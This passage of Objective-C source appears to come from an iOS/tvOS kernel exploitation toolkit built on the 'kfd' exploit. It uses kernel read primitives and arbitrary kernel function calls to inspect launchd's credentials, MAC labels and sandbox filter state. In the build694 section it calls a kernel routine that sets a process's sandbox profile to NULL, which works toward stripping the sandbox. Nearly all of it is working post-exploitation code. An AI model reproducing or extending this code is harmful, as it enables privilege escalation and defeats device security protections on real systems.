    *state_out = fmsg ? dt691_fmsg_state_flag_1 : dt691_fmsg_state_flag_0;
    *fmsg_valid_out = YES;
    if (fmsg_out)
        *fmsg_out = fmsg;
    dt1025_log(log, @"[*] build691 fmsg: valid cell bit14=%u → %s fmsg_valid=1",
        (unsigned)fmsg, dt691_fmsg_state_name(*state_out));
    return 0;
}

static dt690_policy_semantic_t dt691_classify_mig(const dt691_baseline_v1_t *snap,
    void (^log)(NSString *line))
{
    if (snap->mach_sem == dt690_sem_ungated)
        return dt690_sem_null_zero;

    if (snap->mach_sem == dt690_sem_cell_null)
        return dt690_sem_cell_null;

    uint64_t default_mig = snap->ecc3d0;
    if (default_mig == 0 && snap->profile_532c68) {
        uint64_t profile_mig = kread_ptr(snap->profile_532c68 + 48ULL);
        if (profile_mig == 0) {
            dt1025_log(log, @"[*] build691 mig: ECC3D0+profile NULL → NULL_ZERO");
            return dt690_sem_null_zero;
        }
    }
    if (snap->mach_sem == dt690_sem_mask_kva || snap->mach_sem == dt690_sem_opaque)
        return dt690_sem_null_zero;
    return dt690_sem_null_zero;
}

static int dt691_fill_baseline(uint64_t proc_kptr, dt691_baseline_v1_t *out,
    const dt691_ro_zone_globals_t *ro,
    void (^log)(NSString *line))
{
    if (!out || !ro)
        return -1;
    memset(out, 0, sizeof(*out));

    out->proc_kptr = proc_kptr;
    out->task_kptr = proc_task(proc_kptr);
    out->kernproc_kptr = dt688a_runtime_kernproc_kptr();
    out->proc_is_kernproc = out->kernproc_kptr && proc_kptr == out->kernproc_kptr;

    out->proc_ro_kptr = kread_ptr(proc_kptr + koffsetof(proc, proc_ro));
    if (out->proc_ro_kptr)
        out->proc_ro_owner = kread64(out->proc_ro_kptr);
    if (out->proc_ro_kptr)
        (void)kreadbuf(out->proc_ro_kptr, out->proc_ro_bytes, sizeof(out->proc_ro_bytes));

    out->unix_token = out->proc_ro_kptr ? kread_ptr(out->proc_ro_kptr + 0x10ULL) : 0;
    out->unix_sem = dt690_classify_unix_token(proc_kptr, out->proc_ro_kptr, out->unix_token, log);
    if (out->unix_sem == dt690_sem_error)
        return -2;

    out->proc_filter_flags = kread32(proc_kptr + kDTProcFilterFlagsOff);
    if (out->proc_filter_flags & 2u)
        out->filter_ext_kptr = proc_kptr + kDTProcFilterExtOff;

    out->mach_sem = dt690_classify_mach_token(proc_kptr, out->proc_filter_flags,
        &out->mach_cell_kptr, &out->mach_token, &out->mach_cell_w78, log);
    if (out->mach_sem == dt690_sem_error)
        return -3;
    if (out->mach_cell_kptr)
        out->mach_cell_owner = kread64(out->mach_cell_kptr + 8ULL);

    out->ecc3c0 = kread_ptr(dt1025_kva(kDTUnslidDefaultUnixMaskSlot));
    out->ecc3c8 = kread_ptr(dt1025_kva(kDTUnslidDefaultMachMaskSlot));
    out->ecc3d0 = kread_ptr(dt1025_kva(kDTUnslidDefaultMigMaskSlot));

    if (dt688a_kcall_532c68(proc_kptr, log, &out->profile_532c68) != 0)
        return -4;

    uint64_t ucred = proc_ucred(proc_kptr);
    if (ucred)
        out->label_kptr = kread_ptr(ucred + koffsetof(ucred, label));
    out->label_slot0 = dt1025_label_slot_raw(out->label_kptr, 0);

    out->mig_sem = dt691_classify_mig(out, log);

    if (dt691_read_filter_message_kread(proc_kptr, ro, &out->fmsg_state, &out->fmsg_valid,
            &out->filter_message_flag, log) != 0)
        return -5;

    return 0;
}

static void dt691_log_baseline_table(const dt691_baseline_v1_t *b, void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] build691 BASELINE_TABLE proc=0x%llx *kernproc=0x%llx proc==kernproc=%d",
        (unsigned long long)b->proc_kptr,
        (unsigned long long)b->kernproc_kptr,
        b->proc_is_kernproc ? 1 : 0);
    dt1025_log(log, @"[*] build691 BASELINE_TABLE proc_ro=0x%llx owner=0x%llx unix_token=0x%llx "
        @"unix_sem=%s",
        (unsigned long long)b->proc_ro_kptr,
        (unsigned long long)b->proc_ro_owner,
        (unsigned long long)b->unix_token,
        dt690_sem_name(b->unix_sem));
    dt1025_log(log, @"[*] build691 BASELINE_TABLE proc+0x458=0x%x ext=0x%llx mach_cell=0x%llx "
        @"mach_token=0x%llx mach_sem=%s cell+0x78=0x%x",
        (unsigned)b->proc_filter_flags,
        (unsigned long long)b->filter_ext_kptr,
        (unsigned long long)b->mach_cell_kptr,
        (unsigned long long)b->mach_token,
        dt690_sem_name(b->mach_sem),
        (unsigned)b->mach_cell_w78);
    dt1025_log(log, @"[*] build691 BASELINE_TABLE mig_sem=%s fmsg_state=%s fmsg_valid=%d "
        @"fmsg=%u profile=0x%llx slot0=0x%llx",
        dt690_sem_name(b->mig_sem),
        dt691_fmsg_state_name(b->fmsg_state),
        b->fmsg_valid ? 1 : 0,
        (unsigned)b->filter_message_flag,
        (unsigned long long)b->profile_532c68,
        (unsigned long long)b->label_slot0);
    dt1025_log(log, @"[*] build691 BASELINE_TABLE runtime ECC3C0=0x%llx ECC3C8=0x%llx ECC3D0=0x%llx",
        (unsigned long long)b->ecc3c0,
        (unsigned long long)b->ecc3c8,
        (unsigned long long)b->ecc3d0);
    dt1025_log(log, @"[*] build691 proc_ro[0x00..0x7F]=%@",
        dt690_hex_bytes(b->proc_ro_bytes, sizeof(b->proc_ro_bytes)));
}

int dt691_run_baseline_validator(void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt691_stage("KCALL691_BASELINE_BEGIN");
    dt1025_log(log, @"[*] Build691 — read-only baseline (direct fmsg kread, no filter_msg kcall)");

    if (dt1025_kcall_init(log) != 0) {
        dt1025_set_verdict(verdictOut, g_dt1025_last_kcall_verdict ?: @"KCALL691_KCALL_INIT_FAIL");
        return -1;
    }

    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    BOOL app_proc_needs_rele = app_proc != 0;
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    if (!app_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL691_CALIBRATION_PROC_FAIL");
        return -2;
    }

    NSString *calFail = nil;
    if (dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        dt1025_set_verdict(verdictOut, calFail ?: @"KCALL691_KCALL_CALIBRATION_FAIL");
        if (app_proc_needs_rele)
            proc_rele(app_proc);
        return -3;
    }
    if (app_proc_needs_rele)
        proc_rele(app_proc);

    dt691_ro_zone_globals_t ro = {0};
    if (dt691_load_ro_zone_globals(&ro, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL691_RO_GLOBALS_FAIL");
        return -4;
    }

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL691_LAUNCHD_PROC_FAIL");
        return -5;
    }

    dt691_baseline_v1_t baseline = {0};
    dt691_stage("KCALL691_POLICY_BASELINE_BEGIN");
    int fill_r = dt691_fill_baseline(launchd_proc, &baseline, &ro, log);
    if (fill_r != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL691_POLICY_BASELINE_FAIL");
        proc_rele(launchd_proc);
        return -6;
    }

    dt691_log_baseline_table(&baseline, log);
    dt691_stage("KCALL691_POLICY_BASELINE_OK");
    dt691_stage("KCALL691_BASELINE_VALIDATOR_PASS");

    dt1025_log(log, @"[*] build691 semantic summary unix=%s mach=%s mig=%s fmsg_state=%s "
        @"fmsg_valid=%d (CELL_NULL_DIAGNOSTIC ≠ FLAG_0/UNGATED)",
        dt690_sem_name(baseline.unix_sem),
        dt690_sem_name(baseline.mach_sem),
        dt690_sem_name(baseline.mig_sem),
        dt691_fmsg_state_name(baseline.fmsg_state),
        baseline.fmsg_valid ? 1 : 0);

    dt1025_set_verdict(verdictOut, @"KCALL691_BASELINE_VALIDATOR_PASS");
    proc_rele(launchd_proc);
    return 0;
}

int dt_build1025_planb_diagnostic(void (^log)(NSString *line),
                                  NSString *helperPath,
                                  NSString * _Nullable * _Nullable verdictOut,
                                  BOOL *dashAllowedOut)
{
    (void)helperPath;

    dt1025_set_verdict(verdictOut, @"KCALL_UNAVAILABLE");
    dt1025_set_dash(dashAllowedOut, NO);
    dt1025_stage(@"build102.5.2 calibration begin");

    if (!dt_kernel_exploit_is_active()) {
        dt1025_log(log, @"[!] build102.5.2: kfd not active");
        return -1;
    }

    int init_r = dt1025_kcall_init(log);
    if (init_r != 0) {
        dt1025_stage(@"build102.5.2 KCALL_UNAVAILABLE");
        return init_r;
    }

    pid_t pid = getpid();
    uint64_t proc_kptr = proc_find(pid);
    BOOL proc_needs_rele = proc_kptr != 0;
    if (!proc_kptr)
        proc_kptr = dt_kfd_current_proc();
    if (!proc_kptr) {
        dt1025_log(log, @"[!] build102.5.2: no proc kptr for pid=%d", (int)pid);
        dt1025_stage(@"build102.5.2 KCALL_UNAVAILABLE");
        return -2;
    }

    dt1025_log(log, @"[*] build102.5.2 app proc=0x%llx pid=%d", (unsigned long long)proc_kptr, (int)pid);
    (void)dt_build100_log_ctx_proof(log);

    NSString *calFail = nil;
    if (dt10252_run_calibration(proc_kptr, log, &calFail) != 0) {
        dt1025_set_verdict(verdictOut, calFail ?: @"KCALL_CALIBRATION_FAIL");
        dt1025_stage([NSString stringWithFormat:@"build102.5.2 %@", verdictOut ? *verdictOut : @"KCALL_CALIBRATION_FAIL"]);
        if (proc_needs_rele)
            proc_rele(proc_kptr);
        return -3;
    }

    dt1025_set_verdict(verdictOut, @"KCALL_CALIBRATION_OK");
    dt1025_stage(@"build102.5.2 KCALL_CALIBRATION_OK");

    BOOL m3_ok = NO, m4_ok = NO, m5_ok = NO, m7_ok = NO;
    int kpid = 0;
    int probe_r = dt1025_kcall_proc_pid_probe(proc_kptr, log, &kpid, &m3_ok, &m4_ok, &m5_ok, &m7_ok);

    if (probe_r != 0) {
        if (proc_needs_rele)
            proc_rele(proc_kptr);
        if (!m3_ok)
            dt1025_set_verdict(verdictOut, @"KCALL_PROC_PID_ARG_FAIL");
        else if (!m4_ok)
            dt1025_set_verdict(verdictOut, @"KCALL_RETURN_CAPTURE_FAIL");
        else if (!m7_ok)
            dt1025_set_verdict(verdictOut, @"KCALL_BOOTSTRAP_HANDOFF_FAIL");
        else
            dt1025_set_verdict(verdictOut, @"KCALL_SAFE_PROBE_FAIL");
        dt1025_stage([NSString stringWithFormat:@"build102.6.21 %@", verdictOut ? *verdictOut : @"KCALL_SAFE_PROBE_FAIL"]);
        dt1025_log(log, @"[*] build102.6.21 calibration summary M3=%d M4=%d M5=%d M7=%d kpid=%d",
            m3_ok ? 1 : 0, m4_ok ? 1 : 0, m5_ok ? 1 : 0, m7_ok ? 1 : 0, kpid);
        return -4;
    }

    dt1025_set_verdict(verdictOut, @"KCALL_SAFE_PROBE_OK");
    dt1025_stage(@"build102.6.21 KCALL_SAFE_PROBE_OK");
    dt1025_log(log, @"[+] build102.6.21 calibration PASS M3=%d M4=%d M5=%d M7=%d kpid=%d",
        m3_ok ? 1 : 0, m4_ok ? 1 : 0, m5_ok ? 1 : 0, m7_ok ? 1 : 0, kpid);

#if DDT_BUILD_NUM == 102583
    dt1025_set_verdict(verdictOut, @"KCALL583_CALIBRATION_ONLY_NO_BROKER");
    dt1025_stage(@"build102583 KCALL583_CALIBRATION_ONLY_NO_BROKER");
    dt1025_log(log, @"[*] build102583: broker Phase 3 frozen — use Probe A 583 diagnostic");
    if (proc_needs_rele)
        proc_rele(proc_kptr);
    return 0;
#else
    int run_r = dt1025_run_630_phase3_broker_spawn_probe(pid, log, verdictOut);
    if (proc_needs_rele)
        proc_rele(proc_kptr);

    return run_r;
#endif
}

/* =============================================================================
 * BUILD102692 — read-only 532C68 contradiction probe + pointer-return calibration
 * ============================================================================= */

static void dt692_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

typedef struct {
    uint64_t proc;
    uint32_t ecace4;
    uint64_t ucred;
    int cred_gate_pass;
    uint64_t label;
    uint64_t slot_cfg;
    uint64_t slot0_raw;
    uint64_t scratch_before;
    uint64_t kcall_532c68;
    uint64_t scratch_after;
} dt692_probe_pass_t;

static uint64_t dt692_ucred_ida_mirror(uint64_t proc_kptr)
{
    if (!proc_kptr)
        return 0;
    uint64_t proc_ro = kread_ptr(proc_kptr + koffsetof(proc, proc_ro));
    if (!proc_ro)
        return 0;
    return kread_ptr(proc_ro + koffsetof(proc_ro, ucred));
}

static int dt692_cred_gate_pass(uint64_t ucred)
{
    return ucred != 0 && (ucred + 1ULL) >= 2ULL;
}

static void dt692_log_probe_pass(void (^log)(NSString *line), unsigned pass_idx,
    const dt692_probe_pass_t *p)
{
    dt1025_log(log, @"[*] build692 pass%u proc=0x%llx ecace4=%u ucred=0x%llx cred_gate=%d "
        @"label=0x%llx slot_cfg=0x%llx slot0_raw=0x%llx scratch_before=0x%llx "
        @"532C68_kcall=0x%llx scratch_after=0x%llx",
        pass_idx,
        (unsigned long long)p->proc,
        (unsigned)p->ecace4,
        (unsigned long long)p->ucred,
        p->cred_gate_pass,
        (unsigned long long)p->label,
        (unsigned long long)p->slot_cfg,
        (unsigned long long)p->slot0_raw,
        (unsigned long long)p->scratch_before,
        (unsigned long long)p->kcall_532c68,
        (unsigned long long)p->scratch_after);
}

static int dt692_pointer_return_calibration(uint64_t proc_kptr, void (^log)(NSString *line),
    BOOL *ok_out, NSString **failVerdictOut)
{
    uint64_t func = dt1025_kva(kDTUnslidProcUcred);
    uint8_t live[8] = {0};
    if (kreadbuf(func, live, sizeof(live)) != 0) {
        dt1025_log(log, @"[!] build692 pointer-cal kreadbuf failed @ 0x%llx",
            (unsigned long long)func);
        if (failVerdictOut)
            *failVerdictOut = @"KCALL692_POINTER_CAL_TARGET_FAIL";
        if (ok_out)
            *ok_out = NO;
        return -1;
    }

    if (!dt10252_bytes_match(live, kDTProcUcredPrologue, sizeof(kDTProcUcredPrologue))) {
        dt1025_log(log, @"[!] build692 pointer-cal prologue FAIL @ 0x%llx live=%02x%02x%02x%02x%02x%02x%02x%02x "
            @"expect=fd7bbfa9fd030091 (IDA _proc_ucred entry 5E65D8)",
            (unsigned long long)func,
            live[0], live[1], live[2], live[3], live[4], live[5], live[6], live[7]);
        if (failVerdictOut)
            *failVerdictOut = @"KCALL692_POINTER_CAL_TARGET_FAIL";
        if (ok_out)
            *ok_out = NO;
        return -1;
    }

    dt1025_log(log, @"[*] build692 pointer-cal IDA _proc_ucred entry @ 0x%llx "
        @"(STP/MOV; LDR [proc+0x18]; zone5; LDR X0,[proc_ro+0x20]; LDP/RET)",
        (unsigned long long)func);
    dt1025_log(log, @"[*] build692 pointer-cal prologue OK live=fd7bbfa9fd030091");

    uint64_t expected_proj = proc_ucred(proc_kptr);
    uint64_t expected_ida = dt692_ucred_ida_mirror(proc_kptr);

    dt_tvos_kcall_debug_t kd = {0};
    dt_tvos_kcall_get_debug(&kd);
    uint64_t scratch_before = kread64(kd.scratch_kva);

    uint64_t argv[] = { proc_kptr };
    uint64_t kret = 0;
    if (kcall(&kret, func, 1, argv) != 0) {
        dt1025_log(log, @"[!] build692 pointer-cal kcall(_proc_ucred) dispatch failed");
        if (failVerdictOut)
            *failVerdictOut = @"KCALL692_POINTER_CAL_DISPATCH_FAIL";
        if (ok_out)
            *ok_out = NO;
        return -2;
    }

    uint64_t scratch_after = kread64(kd.scratch_kva);
    BOOL match_proj = (kret != 0 && expected_proj != 0 && kret == expected_proj);
    BOOL match_ida = (kret != 0 && expected_ida != 0 && kret == expected_ida);
    BOOL scratch_match = (scratch_after == kret);

    dt1025_log(log, @"[*] build692 pointer-cal expected_proj=0x%llx expected_ida=0x%llx "
        @"kcall_ret=0x%llx scratch_before=0x%llx scratch_after=0x%llx "
        @"match_proj=%d match_ida=%d scratch_match=%d",
        (unsigned long long)expected_proj,
        (unsigned long long)expected_ida,
        (unsigned long long)kret,
        (unsigned long long)scratch_before,
        (unsigned long long)scratch_after,
        match_proj ? 1 : 0,
        match_ida ? 1 : 0,
        scratch_match ? 1 : 0);

    BOOL ok = (match_proj || match_ida) && scratch_match && kret != 0;
    if (ok) {
        dt692_stage("POINTER_RETURN_KCALL_OK");
        dt1025_log(log, @"[*] build692 POINTER_RETURN_KCALL_OK");
    } else {
        dt692_stage("POINTER_RETURN_KCALL_FAIL");
        dt1025_log(log, @"[!] build692 POINTER_RETURN_KCALL_FAIL");
    }
    if (ok_out)
        *ok_out = ok;
    return ok ? 0 : -3;
}

static int dt692_collect_probe_pass(uint64_t proc_kptr, dt692_probe_pass_t *out,
    void (^log)(NSString *line))
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));
    out->proc = proc_kptr;

    out->ecace4 = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    out->ucred = proc_ucred(proc_kptr);
    out->cred_gate_pass = dt692_cred_gate_pass(out->ucred);
    if (out->ucred)
        out->label = kread_ptr(out->ucred + koffsetof(ucred, label));
    if (out->label) {
        out->slot_cfg = dt1025_label_slot_raw(out->label, out->ecace4);
        out->slot0_raw = dt1025_label_slot_raw(out->label, 0);
    }

    dt_tvos_kcall_debug_t kd = {0};
    dt_tvos_kcall_get_debug(&kd);
    out->scratch_before = kread64(kd.scratch_kva);

    uint64_t func = dt1025_kva(kDTUnslidProcToProfile532C68);
    uint64_t argv[] = { proc_kptr };
    uint64_t kret = 0;
    if (kcall(&kret, func, 1, argv) != 0) {
        dt1025_log(log, @"[!] build692 kcall(532C68) dispatch failed");
        return -2;
    }
    out->kcall_532c68 = kret;
    out->scratch_after = kread64(kd.scratch_kva);
    return 0;
}

static NSString *dt692_classify_contradiction(BOOL pointer_cal_ok,
    const dt692_probe_pass_t passes[3])
{
    BOOL cred_stable = (passes[0].ucred == passes[1].ucred &&
        passes[1].ucred == passes[2].ucred);
    BOOL label_stable = (passes[0].label == passes[1].label &&
        passes[1].label == passes[2].label);
    BOOL slot_cfg_stable = (passes[0].slot_cfg == passes[1].slot_cfg &&
        passes[1].slot_cfg == passes[2].slot_cfg);
    BOOL slot0_stable = (passes[0].slot0_raw == passes[1].slot0_raw &&
        passes[1].slot0_raw == passes[2].slot0_raw);
    BOOL kcall_stable = (passes[0].kcall_532c68 == passes[1].kcall_532c68 &&
        passes[1].kcall_532c68 == passes[2].kcall_532c68);

    if (!cred_stable || !label_stable || !slot_cfg_stable || !slot0_stable)
        return @"CRED_OR_LABEL_CHANGED_BETWEEN_SNAPSHOTS";

    const dt692_probe_pass_t *p = &passes[0];
    if (!p->cred_gate_pass)
        return @"CRED_GATE_STATE";

    if (p->ecace4 != 0 && p->slot_cfg != p->slot0_raw && p->slot_cfg != 0 &&
        p->kcall_532c68 == 0)
        return @"CONFIGURED_SLOT_INDEX_MISMATCH";

    if (p->ecace4 == 0 && p->slot0_raw != 0 && p->slot_cfg == p->slot0_raw &&
        p->kcall_532c68 == 0 && !pointer_cal_ok)
        return @"KCALL_POINTER_RETURN_FAILURE";

    if (p->ecace4 == 0 && p->slot0_raw != 0 && p->slot_cfg == p->slot0_raw &&
        p->kcall_532c68 == 0 && pointer_cal_ok)
        return @"532C68_REAL_ZERO";

    if (p->kcall_532c68 != 0 && p->kcall_532c68 == p->slot_cfg)
        return @"CONSISTENT_NO_CONTRADICTION";

    if (p->kcall_532c68 == 0 && p->slot_cfg == 0 && p->slot0_raw == 0)
        return @"CONSISTENT_ALL_ZERO";

    if (p->kcall_532c68 != 0 && p->kcall_532c68 != p->slot_cfg)
        return @"UNRESOLVED";

    return @"UNRESOLVED";
}

static NSString *dt692_trust_verdict(BOOL pointer_cal_ok, NSString *classification)
{
    if ([classification isEqualToString:@"CONSISTENT_NO_CONTRADICTION"] ||
        [classification isEqualToString:@"CONSISTENT_ALL_ZERO"])
        return @"GO";
    if ([classification isEqualToString:@"KCALL_POINTER_RETURN_FAILURE"])
        return @"NO-GO";
    if ([classification isEqualToString:@"532C68_REAL_ZERO"] && pointer_cal_ok)
        return @"OPEN";
    if ([classification isEqualToString:@"CONFIGURED_SLOT_INDEX_MISMATCH"])
        return @"OPEN";
    if ([classification isEqualToString:@"CRED_GATE_STATE"])
        return @"NO-GO";
    return @"OPEN";
}

int dt692_run_contradiction_diagnostic(void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt692_stage("KCALL692_DIAG_BEGIN");

    if (dt1025_kcall_init(log) != 0) {
        dt1025_set_verdict(verdictOut, g_dt1025_last_kcall_verdict ?: @"KCALL692_KCALL_INIT_FAIL");
        return -1;
    }

    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    BOOL app_proc_needs_rele = app_proc != 0;
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    if (!app_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL692_CALIBRATION_PROC_FAIL");
        return -2;
    }

    NSString *calFail = nil;
    if (dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        dt1025_set_verdict(verdictOut, calFail ?: @"KCALL692_KCALL_CALIBRATION_FAIL");
        if (app_proc_needs_rele)
            proc_rele(app_proc);
        return -3;
    }
    if (app_proc_needs_rele)
        proc_rele(app_proc);

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL692_LAUNCHD_PROC_FAIL");
        return -4;
    }

    BOOL pointer_cal_ok = NO;
    NSString *ptrCalFail = nil;
    if (dt692_pointer_return_calibration(launchd_proc, log, &pointer_cal_ok, &ptrCalFail) != 0) {
        dt1025_set_verdict(verdictOut, ptrCalFail ?: @"KCALL692_POINTER_CAL_FAIL");
        proc_rele(launchd_proc);
        return -5;
    }

    static const char *pass_markers_begin[] = {
        "KCALL692_DIAG_PASS_1_BEGIN",
        "KCALL692_DIAG_PASS_2_BEGIN",
        "KCALL692_DIAG_PASS_3_BEGIN",
    };
    static const char *pass_markers_result[] = {
        "KCALL692_DIAG_PASS_1_RESULT",
        "KCALL692_DIAG_PASS_2_RESULT",
        "KCALL692_DIAG_PASS_3_RESULT",
    };

    dt692_probe_pass_t passes[3];
    for (unsigned i = 0; i < 3; i++) {
        dt692_stage(pass_markers_begin[i]);
        int pr = dt692_collect_probe_pass(launchd_proc, &passes[i], log);
        if (pr != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL692_PROBE_PASS_FAIL");
            proc_rele(launchd_proc);
            return -6;
        }
        dt692_log_probe_pass(log, i + 1, &passes[i]);
        dt692_stage(pass_markers_result[i]);
        if (i + 1 < 3)
            usleep(5000);
    }

    NSString *classification = dt692_classify_contradiction(pointer_cal_ok, passes);
    NSString *trust = dt692_trust_verdict(pointer_cal_ok, classification);

    dt1025_log(log, @"[*] build692 KCALL692_DIAG_FINAL_CLASSIFICATION=%@ "
        @"pointer_cal_ok=%d 532C68_trust=%@",
        classification, pointer_cal_ok ? 1 : 0, trust);
    dt692_stage("KCALL692_DIAG_FINAL_CLASSIFICATION");
    dt1025_log(log, @"[*] build692 summary ecace4=%u pass1_kcall=0x%llx pass1_slot_cfg=0x%llx "
        @"pass1_slot0=0x%llx",
        (unsigned)passes[0].ecace4,
        (unsigned long long)passes[0].kcall_532c68,
        (unsigned long long)passes[0].slot_cfg,
        (unsigned long long)passes[0].slot0_raw);

    proc_rele(launchd_proc);

    NSString *finalVerdict = [NSString stringWithFormat:@"KCALL692_DIAG_PASS_%@_TRUST_%@",
        classification, trust];
    dt692_stage("KCALL692_DIAG_PASS");
    dt1025_set_verdict(verdictOut, finalVerdict);
    return 0;
}

/* =============================================================================
 * BUILD102694 — Wall 2 isolated state-transition + restore + sync survival probe
 * apply → consume → restore → compare → observe (no opainject/AMFI/reboot)
 * ============================================================================= */

static const uint64_t kDT694SlotEmptySentinel = 0xffffffffffffffffULL;
static const unsigned kDT694DefaultSyncIntervalSec = 30u;
static const unsigned kDT694SyncObserveSec = 31u;
static NSString *dt102710_hook_path_ns(void)
{
    return dt710_resolve_hook_path() ?: @"";
}

static const char *dt102710_hook_path_cstr(void)
{
    NSString *path = dt102710_hook_path_ns();
    return path.length ? path.fileSystemRepresentation : "";
}

typedef struct {
    uint64_t proc;
    uint64_t ucred;
    uint64_t label;
    uint32_t ecace4;
    uint64_t slot_cfg;
    uint64_t slot0_diag;
    uint64_t profile_532c68;
    uint64_t unix_token;
    dt690_policy_semantic_t unix_sem;
    uint64_t mach_token;
    dt690_policy_semantic_t mach_sem;
    dt690_policy_semantic_t mig_sem;
    uint32_t filter_message;
    dt691_fmsg_state_t fmsg_state;
    BOOL fmsg_valid;
    uint32_t proc_filter_flags;
    BOOL ext_gate_ok;
    uint64_t mach_cell_kptr;
} dt694_wall2_state_t;

static void dt694_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

static void dt694_emit_kv(void (^log)(NSString *line), const char *key, uint64_t val)
{
    dt1025_log(log, @"[*] %s=0x%llx", key, (unsigned long long)val);
    char stage[128];
    snprintf(stage, sizeof(stage), "%s", key);
    dt694_stage(stage);
}

static void dt694_emit_kv_u32(void (^log)(NSString *line), const char *key, uint32_t val)
{
    dt1025_log(log, @"[*] %s=%u", key, (unsigned)val);
    char stage[96];
    snprintf(stage, sizeof(stage), "%s", key);
    dt694_stage(stage);
}

static void dt694_emit_sem(void (^log)(NSString *line), const char *key,
    dt690_policy_semantic_t sem)
{
    dt1025_log(log, @"[*] %s=%s", key, dt690_sem_name(sem));
    char stage[96];
    snprintf(stage, sizeof(stage), "%s", key);
    dt694_stage(stage);
}

static int dt694_kcall_532a80_label_null(uint64_t label_kptr, void (^log)(NSString *line),
    int *kern_ret_out)
{
    /* IDA 532A80 @ 532AA0: X0=mac_label_t, X1=profile_or_NULL */
    uint64_t func = dt1025_kva(kDTUnslidSetProfile532A80);
    uint64_t argv[] = { label_kptr, 0 };
    uint64_t kret = 0;

    dt1025_log(log, @"[*] build694 kcall(532A80) label=0x%llx profile=NULL",
        (unsigned long long)label_kptr);
    if (kcall(&kret, func, 2, argv) != 0) {
        dt1025_log(log, @"[!] build694 kcall(532A80) dispatch failed");
        if (kern_ret_out)
            *kern_ret_out = -1;
        return -1;
    }
    if (kern_ret_out)
        *kern_ret_out = (int)(uint32_t)kret;
    dt1025_log(log, @"[*] build694 kcall(532A80) done kret=0x%llx (validate via readback)",
        (unsigned long long)kret);
    return 0;
}

static uint64_t dt694_live_label(uint64_t proc_kptr)
{
    uint64_t ucred = proc_ucred(proc_kptr);
    if (!ucred)
        return 0;
    return kread_ptr(ucred + koffsetof(ucred, label));
}

static int dt694_capture_state(uint64_t proc_kptr, const dt691_ro_zone_globals_t *ro,
    dt694_wall2_state_t *out, void (^log)(NSString *line))
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));

    out->proc = proc_kptr;
    out->ucred = proc_ucred(proc_kptr);
    if (!out->ucred || !dt692_cred_gate_pass(out->ucred)) {
        dt1025_log(log, @"[!] build694 capture: ucred gate fail ucred=0x%llx",
            (unsigned long long)out->ucred);
        return -2;
    }

    out->label = kread_ptr(out->ucred + koffsetof(ucred, label));
    out->ecace4 = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    if (out->ecace4 > 7u) {
        dt1025_log(log, @"[!] build694 capture: ecace4=%u out of range", (unsigned)out->ecace4);
        return -3;
    }

    out->slot_cfg = dt1025_label_slot_raw(out->label, out->ecace4);
    out->slot0_diag = dt1025_label_slot_raw(out->label, 0);

    if (dt688a_kcall_532c68(proc_kptr, log, &out->profile_532c68) != 0)
        return -4;

    uint64_t proc_ro = kread_ptr(proc_kptr + koffsetof(proc, proc_ro));
    out->unix_token = proc_ro ? kread_ptr(proc_ro + 0x10ULL) : 0;
    out->unix_sem = dt690_classify_unix_token(proc_kptr, proc_ro, out->unix_token, log);
    if (out->unix_sem == dt690_sem_error)
        return -5;

    out->proc_filter_flags = kread32(proc_kptr + kDTProcFilterFlagsOff);
    out->ext_gate_ok = (out->proc_filter_flags & 2u) != 0;
    out->mach_sem = dt690_classify_mach_token(proc_kptr, out->proc_filter_flags,
        &out->mach_cell_kptr, &out->mach_token, NULL, log);
    if (out->mach_sem == dt690_sem_error)
        return -6;

    dt690_baseline_v1_t mig_snap = {0};
    mig_snap.profile_532c68 = out->profile_532c68;
    mig_snap.mach_sem = out->mach_sem;
    mig_snap.ecc3d0 = kread_ptr(dt1025_kva(kDTUnslidDefaultMigMaskSlot));
    out->mig_sem = dt690_classify_mig(&mig_snap, log);

    if (!ro) {
        dt1025_log(log, @"[!] build694 capture: RO zone globals missing");
        return -7;
    }
    if (dt691_read_filter_message_kread(proc_kptr, ro, &out->fmsg_state,
            &out->fmsg_valid, &out->filter_message, log) != 0) {
        return -8;
    }

    return 0;
}

static BOOL dt694_baseline_coherent(const dt694_wall2_state_t *s, void (^log)(NSString *line))
{
    if (!s || !s->ucred || !s->label)
        return NO;
    if (s->unix_sem == dt690_sem_error || s->mach_sem == dt690_sem_error)
        return NO;
    if (s->profile_532c68 != 0 && s->slot_cfg == kDT694SlotEmptySentinel) {
        dt1025_log(log, @"[!] build694 baseline incoherent: profile!=0 slot_cfg=-1");
        return NO;
    }
    if (s->profile_532c68 == 0 && s->slot_cfg != kDT694SlotEmptySentinel
        && s->slot_cfg != 0 && s->ecace4 != 0) {
        dt1025_log(log, @"[!] build694 baseline incoherent: profile=0 slot_cfg=0x%llx",
            (unsigned long long)s->slot_cfg);
        return NO;
    }
    return YES;
}

static BOOL dt694_post_apply_valid(const dt694_wall2_state_t *base,
    const dt694_wall2_state_t *post, void (^log)(NSString *line))
{
    if (!base || !post)
        return NO;
    if (post->ecace4 != base->ecace4) {
        dt1025_log(log, @"[!] build694 post-apply: ECACE4 changed %u -> %u",
            (unsigned)base->ecace4, (unsigned)post->ecace4);
        return NO;
    }
    if (post->slot_cfg == 0 || post->slot_cfg == kDT694SlotEmptySentinel) {
